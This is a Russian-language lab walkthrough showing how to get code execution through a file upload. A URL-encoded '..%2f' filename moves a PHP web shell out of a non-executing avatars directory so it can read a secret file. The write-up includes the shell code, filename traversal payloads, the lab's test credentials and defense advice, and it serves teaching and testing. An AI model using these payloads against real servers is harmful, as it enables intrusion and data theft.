<a id="goal"></a>

## 🎯 Цель

Обойти запрет исполнения файлов в директории загрузок через вторичную уязвимость (path traversal), чтобы:

```text
1. Загрузить PHP веб-шелл в родительскую директорию (/files).
2. Выполнить шелл там, где PHP интерпретируется.
3. Эксфильтровать содержимое /home/carlos/secret и отправить его как решение.
```

Учётные данные тестового пользователя:

```text
wiener:peter
```

---

<a id="theory"></a>

## 🧠 Краткая теория

Типичная защита от upload-to-RCE: сервер **не исполняет** файлы в директории загрузок. Он сохраняет `exploit.php` в `/files/avatars/`, но при запросе отдаёт его как **plain text**, а не запускает PHP-интерпретатор:

```text
GET /files/avatars/exploit.php
Ответ: <?php echo file_get_contents('/home/carlos/secret'); ?>
       (исходник, а не результат выполнения)
```

Такая конфигурация строится на предположении: «файлы пользователей живут только в /files/avatars/». Если в имени файла можно выйти из этой директории — файл можно положить туда, где **исполнение включено**:

```text
filename="../exploit.php"
→ файл сохраняется в /files/exploit.php (на уровень выше)
→ если /files/ исполняется — RCE
```

Это комбинация двух уязвимостей: **отсутствие санитизации filename** + **наивная сегментация исполнения**.

---

<a id="idea"></a>

## 🧩 Ключевая идея

Директория `/files/avatars/` — «запретная зона» для PHP, но директория `/files/` на уровень выше — исполняемая. Имя файла в multipart-запросе контролируется атакующим:

```text
filename="../exploit.php"   → выходим из avatars/ в /files/
```

```text
Фильтр:      расширение .php разрешено (проверки типа нет)
Сохранение:  имя файла используется как есть → path traversal
Исполнение:  в /files/ PHP работает → RCE
```

---

<a id="execution-block"></a>

## 🚫 Почему файлы не исполняются в директории загрузок

На уровне веб-сервера директориям загрузок часто отключают обработку скриптов:

```nginx
# nginx
location /files/avatars/ {
    default_type text/plain;   # отдаётся как текст
}

# Apache
<Directory /files/avatars/>
    php_admin_flag engine off
</Directory>
```

Такая сегментация — хорошая идея, но она защищает **только конкретную директорию**. Если загрузка может уйти в соседнюю директорию, где исполнение включено, защита теряет смысл. Это ровно тот же принцип «проверка не совпадает с границей исполнения», что и во всех SSRF-фильтрах.

<a id="traversal-upload"></a>

## 🏗 Обход через загрузку в родительскую директорию

Загрузка и path traversal обычно считаются разными темами, но filename в multipart-запросе — это тот же «путь», который сервер может некорректно склеить:

```text
/files/avatars/ + ../exploit.php  →  /files/exploit.php
```

Сервер, который не санитизирует `../` в имени файла, позволяет атакующему выбрать **директорию сохранения**.


Универсальный вариант:

```php

```

<a id="exploit"></a>

## ⚡ Пейлоад эксплойта

Файл для загрузки (`exploit.php`):

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Ключевая модификация — имя файла в multipart-запросе:

```text
Обычная попытка:  filename="../exploit.php"      → обрезается сервером
Рабочая:          filename="..%2fexploit.php"    → сервер декодирует → ../exploit.php
```

<a id="step1"></a>

## 🔍 Шаг 1 — Разведка функции загрузки и пути раздачи

1. Авторизоваться под `wiener:peter`.
2. Загрузить обычное изображение как аватар.
3. Вернуться на страницу аккаунта.
4. В Burp → Proxy → HTTP history найти запрос раздачи аватара:

```http
GET /files/avatars/<YOUR-IMAGE> HTTP/1.1
```

и отправить его в Repeater.

---

<a id="step2"></a>

## 🔍 Шаг 2 — Загрузка PHP-шелла и подтверждение запрета исполнения

1. Создать локально `exploit.php`:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

2. Загрузить его как аватар. Сервер **не блокирует** PHP:

```text
The file avatars/exploit.php has been uploaded.
```

3. В Repeater заменить имя изображения на `exploit.php` и отправить GET:

```http
GET /files/avatars/exploit.php
```

4. Ответ — **исходник PHP как plain text**, а не результат выполнения:

```text
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Подтверждено: в `/files/avatars/` исполнение запрещено. Загрузка есть, RCE нет — нужен обход.

---

<a id="step3"></a>

## 🔍 Шаг 3 — Попытка path traversal через filename

В POST-запросе загрузки изменить `Content-Disposition` части файла:

```text
Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
```

Отправить. Ответ:

```text
The file avatars/exploit.php has been uploaded.
```

⚠️ Сервер **обрезал** `../` из имени — сообщение говорит, что файл сохранился как `avatars/exploit.php` (та же директория). Значит, сервер вычищает последовательности `../`.

---

<a id="step4"></a>

## 🔍 Шаг 4 — Обход обрезки через URL-кодирование

Классический приём против «strip-фильтра»: закодировать `/` так, чтобы обрезка не сработала, а декодирование всё равно вернуло последовательность:

```text
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
```

Отправить. Ответ:

```text
The file avatars/../exploit.php has been uploaded.
```

Сообщение показывает **необработанное** имя с `../` — значит, сервер сам декодирует `%2f` и теперь сохраняет файл **на уровень выше**, в `/files/`.

Порядок обработки на сервере:

```text
Получено:   ..%2fexploit.php
Sanitize:   ../ нет в сырой строке → обрезка не срабатывает
URL-decode: %2f → / → путь "../exploit.php"
Сохранение: /files/exploit.php  (выход из avatars/)
```

---

<a id="step5"></a>

## 🔍 Шаг 5 — Выполнение шелла и извлечение секрета

1. Вернуться на страницу аккаунта в браузере (обновить аватар).
2. В HTTP history найти запрос:

```http
GET /files/avatars/..%2fexploit.php
```

3. Ответ — содержимое секрета, а не исходник:

```text
SECRET-VALUE-HERE
```

Файл физически лежит в `/files/exploit.php` — исполняемой директории, поэтому PHP выполнен. Эквивалентный запрос: `GET /files/exploit.php`.

4. Отправить секрет через кнопку в баннере лабы.

Лаборатория получает статус:

```text
Solved
```

<a id="attack-chain"></a>

## 🧾 Полная цепочка атаки

```text
1. Авторизоваться под wiener:peter
2. Загрузить тестовое изображение, найти GET /files/avatars/ в history
3. Загрузить exploit.php — загрузка проходит
4. GET /files/avatars/exploit.php → исходник PHP, исполнение запрещено
5. Попробовать filename="../exploit.php" → сервер обрезает ../
6. Заменить на filename="..%2fexploit.php" → обрезка обойдена,
   сервер декодирует путь и сохраняет файл в /files/
7. Запросить GET /files/avatars/..%2fexploit.php
8. Сервер исполняет PHP, секрет возвращается в ответе
9. Отправить секрет — лаба Solved
```

<a id="breakdown"></a>

## 🔬 Почему атака сработала

### 1. Сегментация исполнения — по директориям

`/files/avatars/` не исполняет PHP, но `/files/` — исполняет. Защита привязана к конкретной директории, а не к сущности «файлы пользователей».

### 2. Filename не санитизирован

Имя файла из multipart-запроса используется для построения пути сохранения. Атакующий контролирует не только имя, но и **директорию сохранения**.

### 3. Sanitize и decode выполняются в неправильном порядке

Сервер сперва вычищает `../` из сырой строки, а потом декодирует URL. `%2f` обходит санитайзер и превращается в `/` уже после проверки:

```text
Sanitize:  ..%2fexploit.php → ../ нет → пропуск
Decode:    ..%2fexploit.php → ../exploit.php → traversal
```

Это та же фундаментальная проблема рассинхрона «проверка видит одно, исполнение — другое», что и в двойном URL-кодировании SSRF-лабы.

### 4. Ответ сервера раскрывает логику фильтра

Сообщения `The file avatars/exploit.php has been uploaded.` и `The file avatars/../exploit.php has been uploaded.` прямо показывают, как сервер обрабатывает имя — бесплатная разведка.

<a id="pentester"></a>

## 🧠 Как думать как пентестер

Когда загрузка проходит, но файл не исполняется — не останавливайся:

```text
1. Где граница исполнения? Протестируй файл в avatars/ — исходник или вывод?
2. Куда конкретно сохраняется файл? Читай сообщения сервера.
3. Можно ли повлиять на директорию сохранения через filename?
4. Как фильтр обрабатывает ../? Strip? Блок? Декодирует ли после проверки?
```

Пробы для filename:

```text
../exploit.php       → проверка санитизации
..%2fexploit.php     → обход обрезки через кодирование
..%252fexploit.php   → двойное кодирование (если декодирует дважды)
....//exploit.php    → обход рекурсивной обрезки
%2e%2e%2fexploit.php → полное кодирование
```

<a id="mistakes"></a>

## ❌ Типичные ошибки

### Ошибка 1. Остановиться после обнаружения «исходника»

Видя `<?php ...` в ответе вместо вывода, легко решить, что лаба «не работает». Это сигнал, что нужен обход запрета исполнения, а не отказ от атаки.

### Ошибка 2. Не проверить реакцию на простой ../

Прежде чем кодировать, нужно увидеть, что сервер делает с `../`: сообщение `avatars/exploit.php` без `../` раскрывает strip-фильтр.

### Ошибка 3. Кодировать весь путь вместо одного символа

Достаточно закодировать `/` (`%2f`). Кодирование точек тоже возможно, но в этой лабе фильтр обрезает именно последовательность с обычным слэшем.

### Ошибка 4. Запрашивать файл по неверному пути после загрузки

После `..%2fexploit.php` ответ пишет `avatars/../exploit.php` — и часть атакующих запрашивает `GET /files/avatars/../exploit.php` как есть. Рабочие пути: `GET /files/avatars/..%2fexploit.php` (как в history) или `GET /files/exploit.php`.

### Ошибка 5. Игнорировать сообщения сервера

Формулировка ответа загрузки — главный источник знаний о том, **куда именно** файл сохранился. Не читать её — терять разведку.

<a id="defense"></a>

## 🛡 Защита

### 1. Не использовать filename для построения пути

Генерировать имя на сервере (UUID) и полностью игнорировать пользовательское:

```python
name = uuid4().hex + ".png"
```

### 2. Санитизировать ПОСЛЕ декодирования

Если filename всё же обрабатывается — декодировать URL первым, затем нормализовать путь и проверять, что итог остаётся внутри разрешённой директории (canonical path check).

### 3. Запретить исполнение для ВСЕХ директорий с пользовательскими файлами

Не только для `/files/avatars/`, а для всего дерева загрузок. Лучшая практика — хранить вне веб-корня и раздавать через прокси.

### 4. Валидировать содержимое

Whitelist расширений + magic bytes + переобработка изображений.

### 5. Сообщения об ошибках без разведки

Не отражать обработанное имя файла и внутренние пути в ответах.

<a id="conclusion"></a>

## 🧾 Итог

Лаборатория решена через **обход запрета исполнения файлов** с помощью path traversal в filename:

```text
1. В /files/avatars/ исполнение запрещено — файл отдаётся как текст
2. filename="../exploit.php" обрезается санитайзером
3. filename="..%2fexploit.php" обходит обрезку —
   сервер декодирует %2f после проверки и сохраняет файл в /files/
4. В /files/ PHP исполняется → секрет прочитан
```

Главные выводы:

```text
Сегментация исполнения защищает только конкретную директорию —
если файл может уйти в соседнюю, защита рушится.
```

```text
Sanitize до декодирования — классическая ошибка порядка операций:
%2f обходит проверку и превращается в / после неё.
```

```text
Filename из multipart-запроса контролирует не только имя, но и директорию сохранения.
```

```text
Ответы сервера, отражающие итоговый путь, — бесплатная разведка логики фильтра.
```
